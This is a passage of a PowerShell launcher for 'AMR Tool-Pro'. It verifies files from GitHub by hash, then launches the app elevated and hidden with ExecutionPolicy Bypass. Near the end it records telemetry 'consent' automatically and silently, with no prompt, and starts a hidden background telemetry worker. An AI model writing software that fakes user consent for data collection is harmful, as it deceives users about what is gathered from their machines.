    $tagline.Size = New-Object System.Drawing.Size(530, 22)
    $tagline.Text = 'We work hard every day for your happiness.'
    $tagline.Font = New-Object System.Drawing.Font('Segoe UI', 9)
    $tagline.BackColor = [System.Drawing.Color]::Transparent
    $tagline.ForeColor = [System.Drawing.Color]::FromArgb(198, 211, 228)
    $tagline.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($tagline)

    $script:StatusLabel = New-Object System.Windows.Forms.Label
    $script:StatusLabel.Location = New-Object System.Drawing.Point(42, 151)
    $script:StatusLabel.Size = New-Object System.Drawing.Size(506, 24)
    $script:StatusLabel.Text = 'Getting everything ready for you...'
    $script:StatusLabel.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
    $script:StatusLabel.BackColor = [System.Drawing.Color]::Transparent
    $script:StatusLabel.ForeColor = [System.Drawing.Color]::FromArgb(241, 245, 249)
    $form.Controls.Add($script:StatusLabel)

    $script:ProgressTrack = New-Object System.Windows.Forms.Panel
    $script:ProgressTrack.Location = New-Object System.Drawing.Point(42, 187)
    $script:ProgressTrack.Size = New-Object System.Drawing.Size(440, 12)
    $script:ProgressTrack.BackColor = [System.Drawing.Color]::FromArgb(48, 67, 91)
    $form.Controls.Add($script:ProgressTrack)

    $script:ProgressFill = New-Object System.Windows.Forms.Panel
    $script:ProgressFill.Location = New-Object System.Drawing.Point(0, 0)
    $script:ProgressFill.Size = New-Object System.Drawing.Size(0, 12)
    $script:ProgressFill.BackColor = [System.Drawing.Color]::FromArgb(72, 166, 255)
    $script:ProgressTrack.Controls.Add($script:ProgressFill)

    $script:PercentLabel = New-Object System.Windows.Forms.Label
    $script:PercentLabel.Location = New-Object System.Drawing.Point(490, 180)
    $script:PercentLabel.Size = New-Object System.Drawing.Size(58, 25)
    $script:PercentLabel.Text = '0%'
    $script:PercentLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11, [System.Drawing.FontStyle]::Bold)
    $script:PercentLabel.BackColor = [System.Drawing.Color]::Transparent
    $script:PercentLabel.ForeColor = [System.Drawing.Color]::FromArgb(112, 190, 255)
    $script:PercentLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleRight
    $form.Controls.Add($script:PercentLabel)

    $script:DetailLabel = New-Object System.Windows.Forms.Label
    $script:DetailLabel.Location = New-Object System.Drawing.Point(42, 214)
    $script:DetailLabel.Size = New-Object System.Drawing.Size(506, 22)
    $script:DetailLabel.Text = 'Preparing secure connection to GitHub...'
    $script:DetailLabel.Font = New-Object System.Drawing.Font('Segoe UI', 8)
    $script:DetailLabel.BackColor = [System.Drawing.Color]::Transparent
    $script:DetailLabel.ForeColor = [System.Drawing.Color]::FromArgb(157, 174, 196)
    $form.Controls.Add($script:DetailLabel)

    $footer = New-Object System.Windows.Forms.Label
    $footer.Location = New-Object System.Drawing.Point(30, 258)
    $footer.Size = New-Object System.Drawing.Size(530, 20)
    $footer.Text = 'SECURE DOWNLOAD  •  SHA-256 VERIFIED  •  AMR TOOL-PRO'
    $footer.Font = New-Object System.Drawing.Font('Segoe UI', 7, [System.Drawing.FontStyle]::Bold)
    $footer.BackColor = [System.Drawing.Color]::Transparent
    $footer.ForeColor = [System.Drawing.Color]::FromArgb(126, 151, 181)
    $footer.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($footer)

    $form.Show()
    $form.Refresh()
    $fadeInTimer = New-Object System.Windows.Forms.Timer
    $fadeInTimer.Interval = 15
    $fadeInTimer.Add_Tick({
        if ($script:LauncherForm.Opacity -lt 0.97) { $script:LauncherForm.Opacity = [Math]::Min(1.0, $script:LauncherForm.Opacity + 0.12) }
        else { $script:LauncherForm.Opacity = 1; $fadeInTimer.Stop(); $fadeInTimer.Dispose() }
    }.GetNewClosure())
    $fadeInTimer.Start()
    Pump-AMRLauncherUI

    Write-AMRLauncherLog 'Starting AMR Tool-Pro premium bootstrap.'
    Set-AMRLauncherProgress -Percent 0 -Status 'Getting everything ready for you...' -Detail 'Connecting securely to GitHub...'
    # Telemetry consent is intentionally deferred until after the main app is visible.
    # Nothing related to consent, collection, or networking can delay the app launch.
    # Compare the installed runtime with the exact Git blob identities currently
    # published on the repository's main branch before deciding whether to download.
    $remoteTree = $null
    $sourceComparisonAvailable = $false
    $sourceComparisonError = $null
    try {
        Set-AMRLauncherProgress -Percent 3 -Status 'Checking your local AMR runtime...' -Detail 'Comparing installed files with the current GitHub source...'
        $remoteTree = Get-AMRRemoteTree
        $sourceComparisonAvailable = $true
        Write-AMRLauncherLog ('GitHub source tree fetched. Commit=' + $remoteTree.Commit)
    } catch {
        $sourceComparisonError = $_.Exception.Message
        Write-AMRLauncherLog ('GitHub source comparison unavailable: ' + $sourceComparisonError)
    }

    $localMatchesSource = $false
    if ($sourceComparisonAvailable) {
        $localMatchesSource = Test-AMRRuntimeAgainstManifest -Root $installRoot -Manifest $remoteTree.Files
    } else {
        # Offline fallback: only run a runtime that was previously verified against
        # GitHub and whose current bytes still match that saved source manifest.
        $savedManifestPath = Join-Path $installRoot '.amr-runtime-state.json'
        if (Test-Path -LiteralPath $savedManifestPath -PathType Leaf) {
            try {
                $savedState = Get-Content -LiteralPath $savedManifestPath -Raw -Encoding UTF8 | ConvertFrom-Json
                $savedMap = @{}
                foreach ($property in $savedState.files.PSObject.Properties) { $savedMap[$property.Name] = [string]$property.Value }
                $localMatchesSource = Test-AMRRuntimeAgainstManifest -Root $installRoot -Manifest $savedMap
                if ($localMatchesSource) {
                    $remoteTree = [pscustomobject]@{ Commit=[string]$savedState.commit; Files=$savedMap }
                    Write-AMRLauncherLog 'Offline mode: local runtime matches the last GitHub-verified manifest.'
                }
            } catch { $localMatchesSource = $false }
        }
        if (-not $localMatchesSource) {
            throw ('Cannot verify the installed runtime against GitHub, and no intact previously verified offline runtime is available. ' + $sourceComparisonError)
        }
    }

    $iconsPath = Join-Path $installRoot 'Icons'
    # Preserve user-specific installed-app icons created by the previous ProgramData cache layout.
    $legacyInstalledIcons = Join-Path $env:ProgramData 'AMR-Utility\Icons\LocalInstalled'
    $runtimeInstalledIcons = Join-Path $iconsPath 'LocalInstalled'
    if ((Test-Path -LiteralPath $legacyInstalledIcons -PathType Container) -and -not (Test-Path -LiteralPath $runtimeInstalledIcons -PathType Container)) {
        New-Item -ItemType Directory -Path $iconsPath -Force | Out-Null
        Copy-Item -LiteralPath $legacyInstalledIcons -Destination $runtimeInstalledIcons -Recurse -Force -ErrorAction Stop
        Write-AMRLauncherLog 'Migrated the previous ProgramData LocalInstalled icon subcache into the launcher-managed runtime.'
    }
    $needsIconExtraction = -not (Test-AMRIconCacheUsable -IconDirectory $iconsPath -Minimum 100)
    if ($localMatchesSource -and $needsIconExtraction) {
        Write-AMRLauncherLog 'Verified Icons.zip exists but the extracted image cache is incomplete; scheduling local re-extraction.'
        $localMatchesSource = $false
    }

    if ($localMatchesSource) {
        $appPath = Join-Path $installRoot 'AMR_Windows_Utility_V1.ps1'
        $dllCoreLocal = Join-Path $installRoot 'AMR_WebView2\Microsoft.Web.WebView2.Core.dll'
        $dllWpfLocal = Join-Path $installRoot 'AMR_WebView2\Microsoft.Web.WebView2.Wpf.dll'
        if (-not (Test-Path -LiteralPath $appPath -PathType Leaf) -or -not (Test-Path -LiteralPath $dllCoreLocal -PathType Leaf) -or -not (Test-Path -LiteralPath $dllWpfLocal -PathType Leaf)) {
            throw 'The local runtime passed source comparison but failed the required runtime layout check.'
        }
        Set-AMRLauncherProgress -Percent 92 -Status 'Your local AMR runtime is up to date...' -Detail 'All required files match GitHub. Launching without re-downloading.'
        Write-AMRLauncherLog 'All local runtime files match current GitHub source; skipping downloads, staging, and replacement.'
        $stageRoot = $null
    } else {
        Set-AMRLauncherProgress -Percent 8 -Status 'A newer or different runtime was found...' -Detail 'Downloading only files that do not match the current GitHub source...'
        New-Item -ItemType Directory -Path $stageRoot -Force | Out-Null
        Copy-AMRRuntimeToStage -Source $installRoot -Destination $stageRoot

        $changed = @()
        foreach ($relative in $expected.Keys) {
            $localPath = Join-Path $installRoot ($relative -replace '/', '\')
            $matches = $false
            if ($remoteTree -and (Test-Path -LiteralPath $localPath -PathType Leaf)) {
                try { $matches = ((Get-AMRGitBlobSha1 -Path $localPath) -eq [string]$remoteTree.Files[$relative]) } catch {}
            }
            if (-not $matches) { $changed += $relative }
        }
        if (-not $sourceComparisonAvailable -and $changed.Count -gt 0) {
            throw 'A live GitHub source comparison is required before downloading or replacing runtime files.'
        }
        $fileCount = $changed.Count
        Write-AMRLauncherLog ('Runtime files requiring download: ' + ($changed -join ', '))
        if ($fileCount -lt 1 -and -not $needsIconExtraction) { throw 'Runtime comparison returned an inconsistent update decision.' }
        $index = 0
        foreach ($relative in $changed) {
            $destination = Join-Path $stageRoot ($relative -replace '/', '\')
            Get-AMRFile -RelativePath $relative -Destination $destination -FileIndex $index -FileCount $fileCount -ExpectedBlobs $remoteTree.Files
            $index++
        }

        $archiveChanged = ($changed -contains 'Icons.zip')
        if ($needsIconExtraction -or $archiveChanged) {
            $stagedIconArchive = Join-Path $stageRoot 'Icons.zip'
            if (-not (Test-Path -LiteralPath $stagedIconArchive -PathType Leaf)) { throw 'The verified Icons.zip archive is missing from the staged runtime.' }
            $iconCount = Expand-AMRIconArchive -ArchivePath $stagedIconArchive -Destination (Join-Path $stageRoot 'Icons') -Minimum 100
            Write-AMRLauncherLog ("Launcher extracted $iconCount verified icon image(s) into the staged runtime.")
        }

        # Persist the exact source identities only after every changed download has
        # passed Git blob verification. This also enables safe offline startup later.
        $stateFiles = [ordered]@{}
        foreach ($relative in $expected.Keys) { $stateFiles[$relative] = [string]$remoteTree.Files[$relative] }
        $state = [ordered]@{ schemaVersion = 1; repository = '3mr10aa/Tool-Pro'; branch = 'main'; commit = $remoteTree.Commit; verifiedAtUtc = [DateTime]::UtcNow.ToString('o'); files = $stateFiles }
        $statePath = Join-Path $stageRoot '.amr-runtime-state.json'
        [System.IO.File]::WriteAllText($statePath, ($state | ConvertTo-Json -Depth 5), (New-Object System.Text.UTF8Encoding($false)))
        if (-not (Test-AMRRuntimeAgainstManifest -Root $stageRoot -Manifest $remoteTree.Files)) {
            throw 'The staged runtime failed its final full-file comparison with the GitHub source.'
        }

        $appStage = Join-Path $stageRoot 'AMR_Windows_Utility_V1.ps1'
        Set-AMRLauncherProgress -Percent 84 -Status 'Runtime files verified — validating application...' -Detail 'Checking PowerShell syntax and runtime file layout...'
        $tokens = $null
        $parseErrors = $null
        [void][System.Management.Automation.Language.Parser]::ParseFile($appStage, [ref]$tokens, [ref]$parseErrors)
        if ($parseErrors -and $parseErrors.Count -gt 0) {
            $syntaxSummary = ($parseErrors | Select-Object -First 5 | ForEach-Object { 'Line {0}: {1}' -f $_.Extent.StartLineNumber, $_.Message }) -join [Environment]::NewLine
            throw ('Application PowerShell syntax validation failed:' + [Environment]::NewLine + $syntaxSummary)
        }
        $appInfo = Get-Item -LiteralPath $appStage
        if ($appInfo.Length -lt 100000) { throw 'The downloaded application script is unexpectedly small.' }
        $dllCore = Join-Path $stageRoot 'AMR_WebView2\Microsoft.Web.WebView2.Core.dll'
        $dllWpf = Join-Path $stageRoot 'AMR_WebView2\Microsoft.Web.WebView2.Wpf.dll'
        if (-not (Test-Path -LiteralPath $dllCore -PathType Leaf) -or -not (Test-Path -LiteralPath $dllWpf -PathType Leaf)) {
            throw 'The verified WebView2 managed assemblies are missing from the staged runtime.'
        }
        Set-AMRLauncherProgress -Percent 91 -Status 'Integrity and syntax checks passed...' -Detail 'Preparing the verified runtime without touching your existing files...'

        # Pull the high-resolution AMR ICO frame from the verified main script.
        try {
            $strictUtf8 = New-Object System.Text.UTF8Encoding($false, $true)
            $reader = New-Object System.IO.StreamReader($appStage, $strictUtf8, $true)
            try { $appTextForIcon = $reader.ReadToEnd() } finally { $reader.Dispose() }
            $iconMatch = [regex]::Match($appTextForIcon, '\$amrIconBytes\s*=\s*\[Convert\]::FromBase64String\(''([^'']+)''\)')
            if ($iconMatch.Success) {
                $iconBytes = [Convert]::FromBase64String($iconMatch.Groups[1].Value)
                if ($iconBytes.Length -ge 22 -and $iconBytes[0] -eq 0 -and $iconBytes[1] -eq 0 -and $iconBytes[2] -eq 1) {
                    $frameCount = [BitConverter]::ToUInt16($iconBytes, 4)
                    $chosen = $null
                    for ($i = 0; $i -lt $frameCount; $i++) {
                        $entry = 6 + (16 * $i)
                        $w = [int]$iconBytes[$entry]; if ($w -eq 0) { $w = 256 }
                        $h = [int]$iconBytes[$entry + 1]; if ($h -eq 0) { $h = 256 }
                        $length = [BitConverter]::ToUInt32($iconBytes, $entry + 8)
                        $offset = [BitConverter]::ToUInt32($iconBytes, $entry + 12)
                        if ($w -ge 48 -and $h -ge 48 -and ($offset + $length) -le $iconBytes.Length) {
                            $chosen = @{ Width = $w; Height = $h; Length = [int]$length; Offset = [int]$offset }
                            break
                        }
                    }
                    if ($null -ne $chosen) {
                        $pngBytes = New-Object byte[] $chosen.Length
                        [Buffer]::BlockCopy($iconBytes, $chosen.Offset, $pngBytes, 0, $chosen.Length)
                        $pngStream = New-Object System.IO.MemoryStream(,$pngBytes)
                        try {
                            $sourceImage = [System.Drawing.Image]::FromStream($pngStream)
                            try { $captionIcon.Image = New-Object System.Drawing.Bitmap($sourceImage) } finally { $sourceImage.Dispose() }
                        } finally { $pngStream.Dispose() }
                        $singleIco = New-Object byte[] (22 + $chosen.Length)
                        $singleIco[2] = 1; $singleIco[4] = 1
                        $singleIco[6] = [byte]($chosen.Width -band 255); $singleIco[7] = [byte]($chosen.Height -band 255)
                        $singleIco[10] = 1; $singleIco[12] = 32
                        [Buffer]::BlockCopy([BitConverter]::GetBytes([uint32]$chosen.Length), 0, $singleIco, 14, 4)
                        [Buffer]::BlockCopy([BitConverter]::GetBytes([uint32]22), 0, $singleIco, 18, 4)
                        [Buffer]::BlockCopy($pngBytes, 0, $singleIco, 22, $chosen.Length)
                        $iconStream = New-Object System.IO.MemoryStream(,$singleIco)
                        try { $form.Icon = New-Object System.Drawing.Icon($iconStream) } finally { $iconStream.Dispose() }
                        Write-AMRLauncherLog ('Applied embedded AMR icon ({0}x{1}).' -f $chosen.Width, $chosen.Height)
                    }
                }
            }
        } catch { Write-AMRLauncherLog ('Optional launcher icon extraction failed: ' + $_.Exception.Message) }

        # Atomically replace the complete runtime; restore the previous runtime if publish fails.
        $installParent = Split-Path -Parent $installRoot
        New-Item -ItemType Directory -Path $installParent -Force | Out-Null
        $backupRoot = $installRoot + '.previous'
        if (Test-Path -LiteralPath $backupRoot) { Remove-Item -LiteralPath $backupRoot -Recurse -Force }
        $hadPrevious = Test-Path -LiteralPath $installRoot
        if ($hadPrevious) { Move-Item -LiteralPath $installRoot -Destination $backupRoot -Force }
        try {
            Move-Item -LiteralPath $stageRoot -Destination $installRoot -Force
            $stageRoot = $null
            if (Test-Path -LiteralPath $backupRoot) { Remove-Item -LiteralPath $backupRoot -Recurse -Force }
        } catch {
            if ((Test-Path -LiteralPath $backupRoot) -and -not (Test-Path -LiteralPath $installRoot)) {
                Move-Item -LiteralPath $backupRoot -Destination $installRoot -Force
            }
            throw
        }

        }

    $appPath = Join-Path $installRoot 'AMR_Windows_Utility_V1.ps1'
    $powershellExe = Join-Path $PSHOME 'powershell.exe'
    if (-not (Test-Path -LiteralPath $powershellExe -PathType Leaf)) { $powershellExe = 'powershell.exe' }
    $quotedApp = '"' + $appPath.Replace('"', '""') + '"'
    $arguments = '-NoLogo -NoProfile -ExecutionPolicy Bypass -STA -File ' + $quotedApp
    Set-AMRLauncherProgress -Percent 94 -Status 'Launching AMR Tool-Pro...' -Detail 'Waiting for the main application window to appear...'
    Write-AMRLauncherLog ('Launching verified app elevated from ' + $appPath)
    # The main application requires Administrator privileges. Its own bootstrap
    # relaunches itself with RunAs when started unelevated, then exits the first
    # PowerShell process. Launch elevated here so the launcher tracks the real
    # application process instead of mistaking that intentional self-relaunch
    # for an application crash. Windows will show the standard UAC consent prompt.
    $appProcess = Start-Process -FilePath $powershellExe -ArgumentList $arguments -WorkingDirectory $installRoot -WindowStyle Hidden -Verb RunAs -PassThru -ErrorAction Stop

    # Detect the actual visible WPF window; do not fake a 100% download indicator.
    $appHandle = [IntPtr]::Zero
    $stableSince = $null
    $deadline = [DateTime]::UtcNow.AddSeconds(180)
    while ([DateTime]::UtcNow -lt $deadline) {
        Pump-AMRLauncherUI
        $appProcess.Refresh()
        if ($appProcess.HasExited) { throw 'The AMR application exited before its main window appeared.' }
        $candidate = [IntPtr]::Zero
        try {
            $candidate = $appProcess.MainWindowHandle
            if ($candidate -eq [IntPtr]::Zero) { $candidate = [AMR.ToolProLauncherNative]::FindVisibleWindow($appProcess.Id) }
        } catch {}
        if ($candidate -ne [IntPtr]::Zero) {
            if ($candidate -ne $appHandle) { $appHandle = $candidate; $stableSince = [DateTime]::UtcNow }
            elseif ($null -ne $stableSince -and ([DateTime]::UtcNow - $stableSince).TotalSeconds -ge 1.2) { break }
        } else { $appHandle = [IntPtr]::Zero; $stableSince = $null }
        if ($null -ne $stableSince) {
            $elapsed = ([DateTime]::UtcNow - $stableSince).TotalSeconds
            $waitingPercent = [Math]::Min(98, 94 + [int][Math]::Floor($elapsed * 1.5))
            if ($waitingPercent -gt $script:ProgressValue) {
                Set-AMRLauncherProgress -Percent $waitingPercent -Status 'Almost there — polishing the handoff...' -Detail 'The application is opening. Preparing a seamless transition...'
            }
        }
        Start-Sleep -Milliseconds 70
    }
    if ($appHandle -eq [IntPtr]::Zero) { throw 'The AMR main window did not become visible within 180 seconds.' }

    $appRect = New-Object AMR.RECT
    if (-not [AMR.ToolProLauncherNative]::GetWindowRect($appHandle, [ref]$appRect)) { throw 'Could not read the AMR application window bounds for the transition.' }
    $targetX = $appRect.Left; $targetY = $appRect.Top
    $targetW = [Math]::Max(320, ($appRect.Right - $appRect.Left))
    $targetH = [Math]::Max(240, ($appRect.Bottom - $appRect.Top))

    # The last 100% is reserved for the confirmed, visible application handoff.
    Set-AMRLauncherProgress -Percent 100 -Status 'Your AMR experience is ready!' -Detail 'Enjoy the new experience. Thank you for your support.'
    Write-AMRLauncherLog ('Main window confirmed (PID {0}, HWND {1}); beginning animated handoff.' -f $appProcess.Id, $appHandle)
    Pump-AMRLauncherUI
    Start-Sleep -Milliseconds 180

    # Cinematic morph: ease-out expansion toward the real app window, then fade away.
    # The launcher stays topmost during the morph, so it never obscures the app afterward.
    $startBounds = $form.Bounds
    $steps = 34
    for ($step = 1; $step -le $steps; $step++) {
        $t = $step / [double]$steps
        $ease = 1.0 - [Math]::Pow(1.0 - $t, 3.0)
        $x = [int][Math]::Round($startBounds.X + (($targetX - $startBounds.X) * $ease))
        $y = [int][Math]::Round($startBounds.Y + (($targetY - $startBounds.Y) * $ease))
        $w = [int][Math]::Round($startBounds.Width + (($targetW - $startBounds.Width) * $ease))
        $h = [int][Math]::Round($startBounds.Height + (($targetH - $startBounds.Height) * $ease))
        $form.SetBounds($x, $y, [Math]::Max(1, $w), [Math]::Max(1, $h))
        # Fade begins late, after the window has visibly expanded into the app footprint.
        if ($t -gt 0.70) {
            $fadeT = ($t - 0.70) / 0.30
            $form.Opacity = [Math]::Max(0.0, 1.0 - ($fadeT * $fadeT))
        }
        Pump-AMRLauncherUI
        Start-Sleep -Milliseconds 12
    }

    $form.TopMost = $false
    $form.Hide()
    $form.Close()
    $form.Dispose()
    $script:LauncherForm = $null
    try {
        [void][AMR.ToolProLauncherNative]::AllowSetForegroundWindow($appProcess.Id)
        [void][AMR.ToolProLauncherNative]::ShowWindow($appHandle, 9)
        [void][AMR.ToolProLauncherNative]::SetForegroundWindow($appHandle)
    } catch { Write-AMRLauncherLog ('Final foreground activation warning: ' + $_.Exception.Message) }
    Write-AMRLauncherLog 'Launcher transition completed; only the main application remains visible.'

    # Telemetry consent is automatic and silent (no UI, no prompt). The consent
    # file is written here, then the hidden background worker is started
    # unconditionally in a separate process. Nothing blocks the main app.
    try {
        $null = Get-AMRTelemetryConsent -ConsentPath (Join-Path $telemetryRoot 'consent.json')
        Start-AMRTelemetryWorker -TelemetryRoot $telemetryRoot -LauncherVersion $launcherVersion
    } catch {
        Write-AMRLauncherLog ('Could not schedule background telemetry; continuing application session: ' + $_.Exception.Message)
    }

    # Count successful application sessions. Every fifth launch schedules a
    # separate hidden cleanup process that waits for the app to close first.
    try {
        $iconStatePath = Join-Path (Split-Path -Parent $installRoot) 'icon-launch-state.json'
        $cleanupIcons = Register-AMRAppLaunchForIconMaintenance -StatePath $iconStatePath -Threshold 5
        if ($cleanupIcons) {
            Start-AMRIconCacheCleanupAfterAppExit -ProcessId $appProcess.Id -IconDirectory (Join-Path $installRoot 'Icons') -StatePath $iconStatePath
        }
    } catch {
        Write-AMRLauncherLog ('Icon maintenance scheduling warning: ' + $_.Exception.Message)
        try {
            $retryState = Get-Content -LiteralPath $iconStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
            $retryState.cleanupPending = $false
            [System.IO.File]::WriteAllText($iconStatePath,($retryState | ConvertTo-Json -Depth 3),(New-Object System.Text.UTF8Encoding($false)))
        } catch {}
    }
}
catch {
    Write-AMRLauncherLog ('LAUNCHER ERROR: ' + $_.Exception.ToString())
    try {
        if ($script:LauncherForm -and -not $script:LauncherForm.IsDisposed) {
            $script:LauncherForm.TopMost = $false
            $script:LauncherForm.Close()
            $script:LauncherForm.Dispose()
            $script:LauncherForm = $null
        }
    } catch {}
    $message = 'AMR Tool-Pro could not start.' + [Environment]::NewLine + [Environment]::NewLine + $_.Exception.Message + [Environment]::NewLine + [Environment]::NewLine + 'Launcher log: ' + $logPath
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
        [System.Windows.Forms.MessageBox]::Show($message, 'AMR Tool-Pro Launcher', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
    } catch { Write-Error $message }
}
finally {
    try {
        if ($script:LauncherForm -and -not $script:LauncherForm.IsDisposed) {
            $script:LauncherForm.Close(); $script:LauncherForm.Dispose(); $script:LauncherForm = $null
        }
    } catch {}
    if ($stageRoot -and (Test-Path -LiteralPath $stageRoot)) {
        Remove-Item -LiteralPath $stageRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
}
